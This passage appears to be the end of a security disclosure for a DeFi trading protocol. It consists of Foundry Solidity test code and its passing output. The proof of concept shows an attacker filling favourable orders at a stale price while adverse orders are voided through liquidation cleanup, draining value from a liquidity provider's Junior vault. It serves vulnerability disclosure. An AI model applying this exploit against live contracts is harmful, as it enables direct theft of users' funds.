        assertEq(uint256(oc.status), uint256(OrderV3Types.LifecycleStatus.Failed), "T failed");
        assertEq(uint256(oc.reason), uint256(OrderV3Types.TerminalReason.AccountLiquidated), "void via liquidation cleanup");
        assertTrue(uint256(oc.reason) != uint256(OrderV3Types.TerminalReason.PlannerRejected), "not the #97858 planner path");
        assertEq(_sizeOf(address(acct)), 0, "account flat");
    }

    /// @notice End-to-end impact, read from system state: attacker withdraws LP funds to its wallet; victim LP down.
    function test_impact_attackerWithdrawsLpFundsToWallet() public {
        _setup();
        console2.log(
            string.concat(
                "setup: victim LP_J Junior ", _usd(juniorVault.convertToAssets(juniorVault.balanceOf(LP_J))),
                " USDG; attacker trading capital ", _usd(FUND), " USDG"
            )
        );

        uint256 snap = vm.snapshotState();
        Outcome memory a = _run(Mode.Attack);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        Outcome memory h = _run(Mode.Honest);
        vm.revertToState(snap);
        Outcome memory b = _run(Mode.Baseline);

        int256 attackerNet = int256(a.attackerWallet) - int256(FUND);
        int256 honestNet = int256(h.attackerWallet) - int256(FUND);
        int256 victimVsBaseline = int256(a.victimValue) - int256(b.victimValue);
        int256 victimVsHonest = int256(a.victimValue) - int256(h.victimValue);

        // every adverse round was voided for free via liquidation cleanup; the two favorable rounds filled at the stale pin
        assertEq(a.voids, 3, "3 adverse rounds voided as AccountLiquidated");
        assertEq(a.fills, 2, "2 favorable rounds filled at the stale pin");
        assertApproxEqAbs(b.attackerWallet, FUND, 10, "baseline: attacker capital returns unchanged");
        assertGt(attackerNet, 0, "ATTACK: attacker ends with more USDG in its wallet");
        assertLt(honestNet, 0, "HONEST: the same orders without the lever lose");
        assertLt(victimVsBaseline, 0, "victim LP_J Junior is worth less than with no attacker");

        console2.log("");
        console2.log("                               before            after             delta");
        console2.log(
            string.concat("  ATTACKER wallet            ", _pad(_usd(FUND)), _pad(_usd(a.attackerWallet)), _usdSigned(attackerNet))
        );
        console2.log(
            string.concat("  VICTIM LP_J Junior value   ", _pad(_usd(b.victimValue)), _pad(_usd(a.victimValue)), _usdSigned(victimVsBaseline))
        );
        console2.log("  (VICTIM before = its Junior value in the no-attacker baseline over the same hours)");
        console2.log("");
        console2.log("IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)");
        console2.log(string.concat("IMPACT attacker net withdrawn to its wallet over ", vm.toString(ROUNDS), " rounds: ", _usdSigned(attackerNet), " USDG"));
        console2.log(string.concat("IMPACT victim LP_J Junior vs the no-attacker baseline: ", _usdSigned(victimVsBaseline), " USDG; vs the honest control: ", _usdSigned(victimVsHonest), " USDG"));
        console2.log(string.concat("IMPACT the same 5 orders without the lever (honest control): ", _usdSigned(honestNet), " USDG"));
        for (uint256 k; k < ROUNDS; ++k) {
            console2.log(
                string.concat(
                    "  round ", vm.toString(k + 1), _favorable(k) ? " favorable: fill at stale pin, P&L " : " adverse: void via liquidation, P&L ",
                    _usdSigned(a.roundPnl[k])
                )
            );
        }
    }

    function _pad(string memory s) internal pure returns (string memory) {
        bytes memory b = bytes(s);
        if (b.length >= 18) return string.concat(s, "  ");
        bytes memory out = new bytes(18);
        for (uint256 i; i < 18; ++i) out[i] = i < b.length ? b[i] : bytes1(" ");
        return string(out);
    }
}
```

### Output

```
[PASS] test_impact_attackerWithdrawsLpFundsToWallet()
  setup: victim LP_J Junior 9999999.999999 USDG; attacker trading capital 500000.000000 USDG

                                 before            after             delta
    ATTACKER wallet            500000.000000     508374.647474     +8374.647474
    VICTIM LP_J Junior value   9999999.999999    9990022.083584    -9977.916415
    (VICTIM before = its Junior value in the no-attacker baseline over the same hours)

  IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)
  IMPACT attacker net withdrawn to its wallet over 5 rounds: +8374.647474 USDG
  IMPACT victim LP_J Junior vs the no-attacker baseline: -9977.916415 USDG; vs the honest control: -21010.527921 USDG
  IMPACT the same 5 orders without the lever (honest control): -15036.162445 USDG
    round 1 adverse: void via liquidation, P&L -3.520028
    round 2 favorable: fill at stale pin, P&L +4192.606971
    round 3 adverse: void via liquidation, P&L -3.520028
    round 4 adverse: void via liquidation, P&L -3.520028
    round 5 favorable: fill at stale pin, P&L +4192.600587

[PASS] test_path_voidIsAccountLiquidation_noLpSettlement()
  T terminal status (3 = Failed)         3
  T terminal reason (9 = AccountLiquidated, NOT 7 PlannerRejected) 9
  pool.totalAssets before / after the void 10000002000604 10000004770050

[PASS] test_root_healthTestIgnoresPendingOpenMargin()
  canary position margin (USDG atoms)       2219473
  T committed/reserved margin (USDG atoms)  40000000000
  canary liquidation threshold, no pending T (bp adverse)  10
  canary liquidation threshold, with pending T (bp adverse) 10

Suite result: ok. 3 passed; 0 failed; 0 skipped
```

Over five rounds the attacker's wallet goes from 500,000.00 to 508,374.65 USDG, +8,374.65, and the victim LP's Junior is worth 9,977.92 USDG less than with no attacker. The voided open's receipt reads reason 9, `AccountLiquidated`, and the canary's liquidation threshold is 10 bp whether or not the 40,000 USDG open is pending.

